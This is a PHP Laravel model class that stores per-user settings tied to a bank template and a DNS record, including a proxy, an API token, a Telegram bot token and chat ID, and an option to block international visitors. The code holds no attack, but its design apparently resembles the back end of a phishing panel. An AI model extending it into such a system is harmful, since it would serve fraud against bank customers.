<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class UserConfig extends Model
{
    protected $table = 'user_configs';

    protected $fillable = ['user_id', 'template_id', 'record_id', 'config', 'config_json'];

    protected $casts = [
        'config_json' => 'array',
        'config' => 'array',
    ];

    public function usuario()
    {
        return $this->belongsTo(Usuario::class, 'user_id');
    }
    
    public function template()
    {
        return $this->belongsTo(BankTemplate::class, 'template_id');
    }
    
    public function record()
    {
        return $this->belongsTo(\App\Models\DnsRecord::class, 'record_id');
    }

    public static function defaultConfig()
    {
        return [
            'modal' => [
                'active' => 0,
                'text' => null
            ],
            'status' => '1',
            'proxy' => null,
            'api' => [
                'url' => '',
                'token' => ''
            ],
            'telegram' => [
                'bot_token' => null,
                'chat_id' => null
            ],
            'security' => [
                'block_international' => 0
            ]
        ];
    }

    public function getConfig($key = null)
    {
        $config = $this->config_json ?: self::defaultConfig();
        
        if ($key === null) {
            return $config;
        }
        
        $keys = explode('.', $key);
        $value = $config;
        
        foreach ($keys as $segment) {
            if (!isset($value[$segment])) {
                return null;
            }
            $value = $value[$segment];
        }
        
        return $value;
    }
}
